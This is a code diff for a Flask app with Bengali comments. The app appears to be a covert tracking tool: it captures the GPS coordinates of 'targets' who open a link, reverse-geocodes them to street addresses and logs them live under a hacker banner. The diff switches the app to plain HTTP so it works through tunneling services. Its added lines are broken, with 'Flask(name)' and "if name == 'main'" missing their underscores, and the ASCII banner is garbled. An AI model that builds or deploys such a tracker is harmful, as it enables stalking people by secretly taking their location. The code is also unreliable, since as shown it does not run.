@@ -3,7 +3,7 @@ import subprocess
 from flask import Flask, render_template, request, jsonify
 from geopy.geocoders import Nominatim
 
-app = Flask(__name__)
+app = Flask(name)
 
 # Geopy OSINT Module Configuration
 geolocator = Nominatim(user_agent="TrackMeNow_OSINT_Engine")
@@ -23,14 +23,14 @@ def update_location():
         longitude = data.get('longitude')
 
         if latitude and longitude:
-            # আপনার আগের সেই কাস্টম লাইভ লগিং স্টাইল
+            # লাইভ ডাটা ইন্টারসেপশন অ্যালার্ট এবং লগিং
             print("\n" + "="*50)
             print(f"[+] TARGET INTERACTION DETECTED!")
             print(f"[*] Latitude  : {latitude}")
             print(f"[*] Longitude : {longitude}")
             print(f"[*] Maps Link : https://maps.google.com/?q={latitude},{longitude}")
             
-            # Geopy ব্যবহার করে ফুল অ্যাড্রেস বের করা
+            # Geopy ব্যবহার করে অক্ষাংশ-দ্রাঘিমাংশ থেকে সম্পূর্ণ ঠিকানা বের করা
             try:
                 location = geolocator.reverse((latitude, longitude), timeout=10)
                 if location:
@@ -49,48 +49,31 @@ def update_location():
         print(f"[-] Server Error: {str(e)}")
         return jsonify({"status": "error", "message": "Internal server error"}), 500
 
-def check_and_generate_certificates():
-    cert_path = "cert.pem"
-    key_path = "key.pem"
-    script_path = "./generate_cert.sh"
-
-    if not os.path.exists(cert_path) or not os.path.exists(key_path):
-        if os.path.exists(script_path):
-            try:
-                subprocess.run(["chmod", "+x", script_path], check=True)
-                subprocess.run([script_path], check=True)
-            except Exception:
-                pass
-    return os.path.exists(cert_path) and os.path.exists(key_path)
-
-if __name__ == '__main__':
-    # আপনার সেই আসল ওল্ড স্কুলের হ্যাকিং ব্যানার ইন্টারফেস
+if name == 'main':
+    # আপনার সেই প্রিয় আসল ওল্ড স্কুলের সবুজ হ্যাকিং ব্যানার ইন্টারফেস
     print("\033[92m" + "="*50)
     print("""
-  _____ ____    _    ____ _  ____  _____ _   _   _    _ 
- |_   _|  _ \  / \  / ___| |/ /  \/  | ____| \ | |/ \  / |
+  _ __    _     _    ___ _   _   _    _ 
+ |_   _|  _ \  / \  / _| |/ /  \/  | __| \ | |/ \  / |
    | | | |_) |/ _ \| |   | ' /| |\/| |  _| |  \| / _ \ | |
-   | | |  _ </ ___ \ |___| . \| |  | | |___| |\  / ___ \| |
-   |_| |_| \_/_/   \_\____|_|\_\_|  |_|_____|_| \_/_/   \_\_|
+   | | |  _ </ _ \ |_| . \| |  | | |_| |\  / _ \| |
+   |_| |_| \_/_/   \_\__|_|\_\_|  |_|___|_| \_/_/   \_\_|
     """)
-    print(" [*] Secure OSINT Location Tracking Engine v1.0.2 [*]")
+    print(" [*] Secure OSINT Location Tracking Engine v1.0.3 [*]")
     print("="*50 + "\033[0m")
     
-    has_certs = check_and_generate_certificates()
-    
-    print("\033[94m[*] Initializing SSL/TLS Layer with self-signed certificates...")
-    print("[+] Framework status: ACTIVE and Listening for incoming payloads...\033[0m")
+    print("\033[94m[*] Initializing Systems...")
+    print("[+] Framework status: ACTIVE and Listening for targets...\033[0m")
     print("\n\033[93m===========[ TARGETING LINKS ]===========\033[0m")
-    print(" LOCAL LOOPBACK : https://127.0.0.1:5000")
-    print(" LAN CAPTURE IP : https://100.73.179.109:5000")
+    print(" LOCAL ACCESS  : http://127.0.0.1:5000")
+    print(" LAN CAPTURE   : http://100.73.179.109:5000")
     print("\033[93m=========================================\033[0m")
-    print("\n[*] Awaiting target interaction. Live logs will stream below...\n")
+    print("\n[*] Live logs will stream down below...\n")
 
-    # Dual HTTP/HTTPS automatic fallback configuration
+    # টানেলিং সার্ভিসের সাথে সামঞ্জস্য রাখার জন্য SSL ছাড়া স্ট্যান্ডার্ড HTTP মোডে রান করা হলো
     app.run(
         host='0.0.0.0', 
         port=5000, 
         debug=True,
         load_dotenv=False
     )
-    
